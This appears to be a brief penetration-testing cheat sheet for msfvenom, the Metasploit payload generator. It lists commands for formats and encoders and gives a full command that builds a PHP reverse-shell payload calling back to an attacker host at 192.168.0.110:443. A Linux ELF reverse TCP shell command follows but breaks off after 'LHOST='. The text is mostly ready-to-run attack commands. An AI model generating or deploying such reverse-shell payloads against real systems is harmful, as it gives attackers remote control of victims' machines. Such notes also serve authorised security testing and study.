# Msfvenom

## **MSF Venom Payloads**

```
msfvenom --list formats
msfvenom --list encoders
```

**PHP**

```
msfvenom -p php/reverse_php LHOST=192.168.0.110 LPORT=443 > tmp.php
```

**Linux Elf**

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=
```
